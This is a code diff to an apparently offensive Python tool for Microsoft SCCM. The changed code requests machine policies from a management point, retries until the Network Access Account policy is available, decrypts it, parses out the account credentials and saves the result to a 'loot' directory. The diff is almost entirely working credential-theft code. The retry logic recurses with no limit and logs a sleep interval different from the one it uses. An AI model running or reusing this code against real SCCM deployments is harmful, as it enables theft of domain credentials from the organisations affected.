@@ -160,22 +160,41 @@ class SCCMTools():
         #for manual retrieval
         if mp:
             self._serverURI = mp
-
         if auth:
-          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
+            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
         else:
-          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
+            r = self.sendCCMPostRequestWithOutAuth(data, headers)
+        if r:
+            multipart_data = decoder.MultipartDecoder.from_response(r)
+            for part in multipart_data.parts:
+                if part.headers[b'content-type'] == b'application/octet-stream':
+                    return zlib.decompress(part.content).decode('utf-16')
+                else:
+                    pass
 
-        multipart_data = decoder.MultipartDecoder.from_response(r)
-        for part in multipart_data.parts:
-            if part.headers[b'content-type'] == b'application/octet-stream':
-                return zlib.decompress(part.content).decode('utf-16')
-            if part.headers[b'content-type'] == b'text/html':
-                logger.info("Got an unexepcted mimetype error. Use -debug to print the response.")
-                logger.debug("Response headers: ")
-                logger.debug(r.headers)
-                logger.debug("Response content:")
-                logger.debug(r.content)
+            
+    def sendCCMPostRequestWithOutAuth(self, data, headers):
+        r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
+        #check if the response actually has a body, if not sleep and try again
+        if r.headers.get('Content-Length') == "0":
+            logger.info(f"[*] Policy isn't ready yet, sleeping {self.sleep} seconds.")
+            time.sleep(5)
+            return self.sendCCMPostRequestWithOutAuth(data, headers)
+        else:
+            logger.debug("[*] Policy available, decoding")
+            multipart_data = decoder.MultipartDecoder.from_response(r)
+            for part in multipart_data.parts:
+                if part is not None and part.headers[b'content-type'] == b'application/octet-stream':
+                    try:
+                        decompressed = zlib.decompress(part.content).decode('utf-16')
+                        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", decompressed, re.DOTALL + re.MULTILINE)
+                        if result:
+
+                            return r
+                    except Exception as e:
+                        print(e)
+
+    
 
     def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
         headers = {
@@ -192,9 +211,6 @@ class SCCMTools():
           if key:
               self.key = key
           headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
-
-
-
         r = requests.get(f"{self._serverURI}"+url, headers=headers)
         if retcontent == True:
           return r.content
@@ -273,12 +289,10 @@ class SCCMTools():
 
         with open (f"{self.logs_dir}/{uuid}.data", "wb") as f:
             f.write(data)
-
- 
         deflatedData = self.sendCCMPostRequest(data)
         result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
-        #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
         return [result.group(1)]
+
 
     def parseEncryptedPolicy(self, result):
         # Man.. asn1 suxx!
@@ -353,6 +367,7 @@ class SCCMTools():
             index = xml_file.find("</Policy>")
             if index != -1:
                 clean = xml_file[:index + len("</Policy>")]
+
             i = ET.fromstring(clean)
             for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
                 network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
@@ -408,7 +423,6 @@ class SCCMTools():
 
         logger.debug("[*] Parsing for Secretz...")
 
-        policies = []
         for url in urls:
             result = self.requestPolicy(url)
             if result.startswith("<HTML>"):
@@ -416,15 +430,12 @@ class SCCMTools():
                     result = self.requestPolicy(url, uuid, True, True)
                     decryptedResult = self.parseEncryptedPolicy(result)
                     self.parse_xml(decryptedResult)
-                    file_name = f"{self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml"
+                    file_name = f"{self.logs_dir}/loot/naapolicy.xml"
                     Tools.write_to_file(decryptedResult, file_name)
-                    policies.append(file_name)
-                    logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
-                    #self.cleanupCertificate(True)
+                    logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
                     return True
                 except:
                     logger.info(f"[-] Something went wrong.")
-        #self.cleanupCertificate(True)
         return False
                 
         
